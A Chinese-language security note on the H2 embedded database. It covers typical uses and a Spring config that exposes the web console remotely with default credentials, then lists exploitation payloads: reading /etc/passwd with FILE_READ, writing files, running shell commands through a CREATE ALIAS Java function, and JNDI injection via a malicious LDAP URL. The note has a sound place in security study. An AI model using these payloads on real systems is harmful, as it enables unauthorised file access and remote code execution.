---
title: "H2 database"
author: ["4shen0ne"]
draft: false
---

H2 是用 java 开发的嵌入式数据库，其本身只是一个类库(jar 文件)，可以直接嵌入到应
用项目中。

主要用途：

1.  和应用一起打包发布，方便存储少量的结构化数据。
2.  用于单元测试，启动速度快，关闭持久化功能后每次测试完都会还原数据。
3.  作为缓存(内存数据库)使用，缓存一些不经常变化但需要频繁访问的数据，比如字典表、
    权限表。

示例配置文件：

```nil
spring.datasource.url = jdbc:h2:mem:dbtest
#配置h2数据库的连接地址
spring.datasource.username = sa
#配置数据库用户名
spring.datasource.password = sa
#配置数据库密码
spring.datasource.driverClassName =org.h2.Driver
#配置JDBC Driver
##数据初始化设置
spring.datasource.schema=classpath:db/schema.sql
#进行该配置后，每次启动程序，程序都会运行resources/db/schema.sql文件，对数据库的结构进行操作。
spring.datasource.data=classpath:db/data.sql
#进行该配置后，每次启动程序，程序都会运行resources/db/data.sql文件，对数据库的数据操作。
##h2 web console设置
spring.datasource.platform=h2
#表明使用的数据库平台是h2
spring.h2.console.settings.web-allow-others=true
# 进行该配置后，h2 web consloe就可以在远程访问了。否则只能在本机访问。
spring.h2.console.path=/h2
#进行该配置，你就可以通过YOUR_URL/h2访问h2 web consloe。YOUR_URL是你程序的访问URl。
spring.h2.console.enabled=true
#进行该配置，程序开启时就会启动h2 web consloe。当然这是默认的，如果你不想在启动程序时启动h2 web consloe，那么就设置为false。
```

`spring.h2.console.settings.web-allow-others` 设置为 true，则允许任意用户访问
console，同时默认的数据库 test 登陆用户名是 sa，密码为 null，存在信息泄漏风险。

console 默认端口：8082
数据库默认端口：9092


## 利用方式 {#利用方式}

1.  文件读取
    使用 `FILE_READ` 函数进行敏感文件的读取(需要管理员权限)，支持文件名和 URL 方式进
    行读取。

    ```text
    SELECT FILE_READ('/etc/passwd', NULL) CSS;
    ```

    第二个参数为字符集，NULL 表示使用系统默认。

2.  文件写入
    使用 `FILE_WRITE` 函数进行文件写入(需要管理员权限和文件的写权限)。

    ```text
    SELECT FILE_WRITE('00000074000000650000007300000074', '/tmp/hello.txt');
    ```

3.  执行 java 代码
    通过 `CREATE ALIAS` 定义一个函数，并使用 `CALL` 调用。
    ```nil
       CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
       CALL SHELLEXEC('id')
    ```

4.  JNDI 注入
    通过配置 H2 Console 的 Driver CLASS 和 JDBC URL，即可触发一个 JNDI 注入。

    | Setting Name             | Generic JNDI Data Source （名称随意）          |
    |--------------------------|------------------------------------------|
    | Driver Class             | javax.naming.InitialContext （JDK 自带也不用考虑额外的驱动） |
    | JDBC URL                 | ldap://ip:port/jndi （恶意 LDAP Server）       |
    | User Name &amp; Password | 设置为空                                       |

5.  SQL 注入
